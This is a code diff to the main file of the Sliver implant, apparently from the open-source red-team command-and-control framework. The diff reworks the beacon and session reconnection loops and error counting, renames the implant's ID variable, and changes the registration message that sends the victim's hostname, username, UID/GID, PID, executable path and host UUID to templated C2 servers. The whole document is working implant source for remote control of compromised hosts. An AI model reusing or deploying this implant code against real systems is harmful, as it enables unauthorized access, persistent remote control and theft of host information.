@@ -36,9 +36,6 @@ import (
 
 	// {{if .Config.IsBeacon}}
 	"sync"
-
-	"github.com/gofrs/uuid"
-
 	// {{end}}
 
 	// {{if .Config.Debug}}{{else}}
@@ -59,6 +56,7 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/version"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 
+	"github.com/gofrs/uuid"
 	"google.golang.org/protobuf/proto"
 	"google.golang.org/protobuf/reflect/protoreflect"
 
@@ -71,15 +69,15 @@ import (
 )
 
 var (
-	// {{if .Config.IsBeacon}}
-	BeaconID string
-	// {{end}}
+	InstanceID string
 
 	c2Servers = []string{
 		// {{range $index, $value := .Config.C2}}
 		"{{$value}}", // {{$index}}
 		// {{end}}
 	}
+
+	connectionErrors = 0
 )
 
 func init() {
@@ -91,15 +89,13 @@ func init() {
 	}
 	insecureRand.Seed(int64(seed))
 
-	// {{if .Config.IsBeacon}}
 	id, err := uuid.NewV4()
 	if err != nil {
 		buf := make([]byte, 16) // NewV4 fails if secure rand fails
 		insecureRand.Read(buf)
 		id = uuid.FromBytesOrNil(buf)
 	}
-	BeaconID = id.String()
-	// {{end}}
+	InstanceID = id.String()
 }
 
 // {{if .Config.IsService}}
@@ -112,11 +108,25 @@ func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, ch
 	for {
 		select {
 		default:
-			connection := transports.StartConnectionLoop(c2Servers)
-			if connection == nil {
-				break
+			abort := make(chan struct{})
+			connections := transports.StartConnectionLoop(c2Servers, abort)
+			for connection := range connections {
+				if connection == nil {
+					break
+				}
+				err := sessionMainLoop(connection)
+				if err != nil {
+					connectionErrors++
+					if transports.GetMaxConnectionErrors() < connectionErrors {
+						return
+					}
+				}
+				reconnect := transports.GetReconnectInterval()
+				// {{if .Config.Debug}}
+				log.Printf("Reconnect sleep: %s", reconnect)
+				// {{end}}
+				time.Sleep(reconnect)
 			}
-			sessionMainLoop(connection)
 		case c := <-r:
 			switch c.Cmd {
 			case svc.Interrogate:
@@ -197,21 +207,24 @@ func main() {
 	// {{if .Config.IsBeacon}}
 
 	// {{if .Config.Debug}}
-	log.Printf("Running in Beacon mode with ID: %s", BeaconID)
+	log.Printf("Running in Beacon mode with ID: %s", InstanceID)
 	// {{end}}
 	abort := make(chan struct{})
 	defer func() {
 		abort <- struct{}{}
 	}()
-	beaconGenerator := transports.StartBeaconLoop(c2Servers, abort)
-	for beacon := range beaconGenerator {
+	beacons := transports.StartBeaconLoop(c2Servers, abort)
+	for beacon := range beacons {
 		// {{if .Config.Debug}}
 		log.Printf("Next beacon = %v", beacon)
 		// {{end}}
 		if beacon != nil {
 			err := beaconMainLoop(beacon)
 			if err != nil {
-				break
+				connectionErrors++
+				if transports.GetMaxConnectionErrors() < connectionErrors {
+					return
+				}
 			}
 		}
 		reconnect := transports.GetReconnectInterval()
@@ -221,15 +234,25 @@ func main() {
 		time.Sleep(reconnect)
 	}
 
-	// {{else}}
+	// {{else}} ------- IsBeacon/IsSession -------
 
 	// {{if .Config.Debug}}
 	log.Printf("Running in session mode")
 	// {{end}}
-	for {
-		connection := transports.StartConnectionLoop(c2Servers)
+	abort := make(chan struct{})
+	defer func() {
+		abort <- struct{}{}
+	}()
+	connections := transports.StartConnectionLoop(c2Servers, abort)
+	for connection := range connections {
 		if connection != nil {
-			sessionMainLoop(connection)
+			err := sessionMainLoop(connection)
+			if err != nil {
+				connectionErrors++
+				if transports.GetMaxConnectionErrors() < connectionErrors {
+					return
+				}
+			}
 		}
 		reconnect := transports.GetReconnectInterval()
 		// {{if .Config.Debug}}
@@ -243,22 +266,14 @@ func main() {
 }
 
 // {{if .Config.IsBeacon}}
-var (
-	beaconErrors = 0
-)
-
 func beaconMainLoop(beacon *transports.Beacon) error {
 	// Register beacon
 	err := beacon.Init()
 	if err != nil {
-		beaconErrors++
-		if transports.GetMaxConnectionErrors() < beaconErrors {
-			return err
-		}
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] init failure %s", err)
+		log.Printf("Beacon init error: %s", err)
 		// {{end}}
-		return nil
+		return err
 	}
 	defer func() {
 		err := beacon.Cleanup()
@@ -274,21 +289,22 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		// {{if .Config.Debug}}
 		log.Printf("Error starting beacon: %s", err)
 		// {{end}}
-		beaconErrors++
-		if transports.GetMaxConnectionErrors() < beaconErrors {
+		connectionErrors++
+		if transports.GetMaxConnectionErrors() < connectionErrors {
 			return err
 		}
 		return nil
 	}
+	connectionErrors = 0
 	// {{if .Config.Debug}}
 	log.Printf("Registering beacon with server")
 	// {{end}}
 	nextCheckin := time.Now().Add(beacon.Duration())
 	beacon.Send(Envelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
-		ID:          BeaconID,
+		ID:          InstanceID,
 		Interval:    beacon.Interval(),
 		Jitter:      beacon.Jitter(),
-		Register:    RegisterSliver(),
+		Register:    registerSliver(),
 		NextCheckin: nextCheckin.UTC().Unix(),
 	}))
 	beacon.Close()
@@ -341,7 +357,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	log.Printf("[beacon] sending check in ...")
 	// {{end}}
 	err = beacon.Send(Envelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
-		ID:          BeaconID,
+		ID:          InstanceID,
 		NextCheckin: nextCheckin.UTC().Unix(),
 	}))
 	if err != nil {
@@ -440,7 +456,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	// {{end}}
 
 	err = beacon.Send(Envelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
-		ID:    BeaconID,
+		ID:    InstanceID,
 		Tasks: results,
 	}))
 	if err != nil {
@@ -473,25 +489,53 @@ func openSessionHandler(data []byte) {
 	}
 
 	go func() {
-		connection := transports.StartConnectionLoop(openSession.C2S)
-		// {{if .Config.Debug}}
-		if connection == nil {
-			log.Printf("[beacon] failed to open session!")
-		}
-		// {{end}}
-		if connection != nil {
-			sessionMainLoop(connection)
+		abort := make(chan struct{})
+		connections := transports.StartConnectionLoop(openSession.C2S, abort)
+		defer func() { abort <- struct{}{} }()
+		connectionAttempts := 0
+		for connection := range connections {
+			connectionAttempts++
+			if connection != nil {
+				err := sessionMainLoop(connection)
+				if err == nil {
+					break
+				}
+				// {{if .Config.Debug}}
+				log.Printf("[beacon] failed to connect to server: %s", err)
+				// {{end}}
+			}
+			if len(openSession.C2S) <= connectionAttempts {
+				// {{if .Config.Debug}}
+				log.Printf("[beacon] failed to connect to server, max connection attempts reached")
+				// {{end}}
+				break
+			}
 		}
 	}()
 }
 
 // {{end}} -IsBeacon
 
-func sessionMainLoop(connection *transports.Connection) {
+func sessionMainLoop(connection *transports.Connection) error {
+	err := connection.Start()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[session] failed to establish connection: %s", err)
+		// {{end}}
+		return err
+	}
+	if connection == nil {
+		// {{if .Config.Debug}}
+		log.Printf("[session] nil connection!")
+		// {{end}}
+		return nil
+	}
+	defer connection.Stop()
+	connectionErrors = 0
 	// Reconnect active pivots
 	// pivots.ReconnectActivePivots(connection)
 
-	connection.Send <- Envelope(sliverpb.MsgRegister, RegisterSliver()) // Send registration information
+	connection.Send <- Envelope(sliverpb.MsgRegister, registerSliver()) // Send registration information
 
 	pivotHandlers := handlers.GetPivotHandlers()
 	tunHandlers := handlers.GetTunnelHandlers()
@@ -557,6 +601,7 @@ func sessionMainLoop(connection *transports.Connection) {
 			}
 		}
 	}
+	return nil
 }
 
 // Envelope - Creates an envelope with the given type and data.
@@ -574,8 +619,8 @@ func Envelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.Envel
 	}
 }
 
-// RegisterSliver - Creates a registartion protobuf message
-func RegisterSliver() *sliverpb.Register {
+// registerSliver - Creates a registartion protobuf message
+func registerSliver() *sliverpb.Register {
 	hostname, err := os.Hostname()
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -592,9 +637,9 @@ func RegisterSliver() *sliverpb.Register {
 
 		// Gracefully error out
 		currentUser = &user.User{
-			Username: "<< error >>",
-			Uid:      "<< error >>",
-			Gid:      "<< error >>",
+			Username: "<err>",
+			Uid:      "<err>",
+			Gid:      "<err>",
 		}
 
 	}
@@ -605,32 +650,32 @@ func RegisterSliver() *sliverpb.Register {
 		if 0 < len(os.Args) {
 			filename = os.Args[0]
 		} else {
-			filename = "<< error >>"
+			filename = "<err>"
 		}
 	}
 
 	// Retrieve UUID
 	uuid := hostuuid.GetUUID()
 	// {{if .Config.Debug}}
-	log.Printf("Uuid: %s", uuid)
+	log.Printf("Host Uuid: %s", uuid)
 	// {{end}}
 
 	return &sliverpb.Register{
-		Name:              consts.SliverName,
-		Hostname:          hostname,
-		Uuid:              uuid,
-		Username:          currentUser.Username,
-		Uid:               currentUser.Uid,
-		Gid:               currentUser.Gid,
-		Os:                runtime.GOOS,
-		Version:           version.GetVersion(),
-		Arch:              runtime.GOARCH,
-		Pid:               int32(os.Getpid()),
-		Filename:          filename,
-		ActiveC2:          transports.GetActiveC2(),
+		Name:     consts.SliverName,
+		Hostname: hostname,
+		Uuid:     uuid,
+		Username: currentUser.Username,
+		Uid:      currentUser.Uid,
+		Gid:      currentUser.Gid,
+		Os:       runtime.GOOS,
+		Version:  version.GetVersion(),
+		Arch:     runtime.GOARCH,
+		Pid:      int32(os.Getpid()),
+		Filename: filename,
+		// ActiveC2:          transports.GetActiveC2(),
 		ReconnectInterval: int64(transports.GetReconnectInterval()),
-		ProxyURL:          transports.GetProxyURL(),
-		ConfigID:          "{{ .Config.ID }}",
+		// ProxyURL:          transports.GetProxyURL(),
+		ConfigID: "{{ .Config.ID }}",
 		// {{if .Config.IsDaemon}}
 		IsDaemon: true,
 		// {{else}}
